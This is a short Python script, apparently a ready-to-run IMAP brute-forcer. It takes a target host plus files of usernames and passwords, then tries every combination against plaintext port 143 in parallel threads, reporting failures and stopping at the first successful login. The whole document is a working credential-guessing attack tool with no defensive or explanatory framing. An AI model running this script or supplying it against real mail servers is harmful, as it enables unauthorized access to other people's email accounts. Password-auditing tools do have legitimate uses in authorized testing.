import imaplib
import socket
import sys
import threading
import argparse
from concurrent.futures import ThreadPoolExecutor, as_completed

found = threading.Event()

def try_login(server, username, password):
    if found.is_set():
        return

    try:
        print(f"[~] Connecting to {server}:143 for {username}:{password}")
        imap = imaplib.IMAP4(server, 143)
        print(f"[~] Server greeting: {imap.welcome.decode()}")

        typ, msg = imap.login(username, password)
        print(f"[+] SUCCESS: {username}:{password}")
        print(f"[*] Server response: {msg}")
        found.set()
        imap.logout()
        return True

    except imaplib.IMAP4.error as e:
        print(f"[-] Login failed: {username}:{password}")
        print(f"[~] Server error message: {e}")
    except (socket.error, socket.timeout) as e:
        print(f"[!] Connection error: {e}")
    return False

def main():
    parser = argparse.ArgumentParser(description="IMAP Brute Forcer (Plaintext, No SSL)")
    parser.add_argument("host", help="Target host")
    parser.add_argument("userfile", help="File with usernames")
    parser.add_argument("passfile", help="File with passwords")
    parser.add_argument("--threads", type=int, default=10, help="Number of concurrent threads (default: 10)")
    args = parser.parse_args()

    with open(args.userfile, 'r') as u_file, open(args.passfile, 'r') as p_file:
        users = [u.strip() for u in u_file if u.strip()]
        passwords = [p.strip() for p in p_file if p.strip()]

    combos = [(user, pw) for user in users for pw in passwords]

    with ThreadPoolExecutor(max_workers=args.threads) as executor:
        futures = {
            executor.submit(try_login, args.host, user, pw): (user, pw)
            for user, pw in combos
        }

        for future in as_completed(futures):
            if found.is_set():
                break

if __name__ == "__main__":
    main()
